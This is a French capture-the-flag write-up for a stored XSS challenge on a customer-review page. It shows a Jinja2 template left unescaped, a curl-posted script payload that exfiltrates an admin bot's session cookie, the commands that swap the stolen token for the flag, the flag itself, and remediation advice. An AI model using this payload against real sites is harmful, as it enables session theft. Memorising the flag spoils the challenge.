# Avis Clients — Cookie Theft (Stored XSS)

**Catégorie :** Web - XSS
**Difficulté :** Moyenne
**Points :** 200

## Objectif

Voler le cookie de session d'un "bot admin" qui consulte périodiquement la page d'avis clients, puis l'échanger contre un flag.

## Vulnérabilité

Le template Jinja2 désactive volontairement l'échappement automatique du HTML sur le champ commentaire :

```html
{{ commentaire | safe }}
```

Tout contenu HTML/JS soumis dans un avis est donc rendu tel quel pour **tous** les visiteurs de la page, y compris un bot qui simule un administrateur consultant les avis via un navigateur headless (Playwright), avec son cookie `admin_token` en session.

## Exploitation

**1. Poster un commentaire contenant un payload JS d'exfiltration**

```bash
curl -X POST http://<cible>:5002/ \
  --data-urlencode "auteur=Client" \
  --data-urlencode "commentaire=<script>fetch('http://<cible>:5002/exfil?data='+document.cookie)</script>"
```

**2. Attendre le passage du bot admin**

Le bot visite la page toutes les 15 secondes avec un vrai navigateur (Chromium headless), ce qui exécute réellement le `<script>` injecté — contrairement à un simple scraper HTTP qui ne ferait qu'un GET sans rendu JS.

**3. Récupérer le cookie exfiltré**

```bash
curl http://<cible>:5002/exfil/log
# admin_token=<uuid>
```

**4. Échanger le token contre le flag**

```bash
curl "http://<cible>:5002/admin/cookie?token=<uuid_recupere>"
```

## Résultat

```json
{"flag": "FLAG{st0r3d_xss_c00k13_th3ft}"}
```

## Point pédagogique

Un bot de test basé sur une librairie HTTP pure (type `requests` en Python) ne détecterait **jamais** ce genre de XSS, car il ne fait que télécharger le HTML brut sans l'exécuter. Un véritable test doit simuler un navigateur réel (Playwright/Selenium) pour détecter les XSS qui dépendent de l'exécution JS — c'est aussi pourquoi les scanners automatiques "bêtes" manquent souvent ce type de vulnérabilité.

## Flag

```
FLAG{st0r3d_xss_c00k13_th3ft}
```

## Remédiation

- Ne jamais désactiver l'échappement automatique (`| safe` en Jinja2) sur du contenu utilisateur.
- Si du HTML enrichi doit être supporté (formatage de texte), utiliser une librairie de sanitization dédiée (ex: `bleach` en Python) avec liste blanche stricte de balises/attributs.
- Mettre en place une Content-Security-Policy (CSP) stricte pour limiter l'impact même en cas d'injection réussie.
- Cookies de session en `HttpOnly` pour empêcher `document.cookie` d'y accéder depuis JS (aurait neutralisé cette attaque précise).
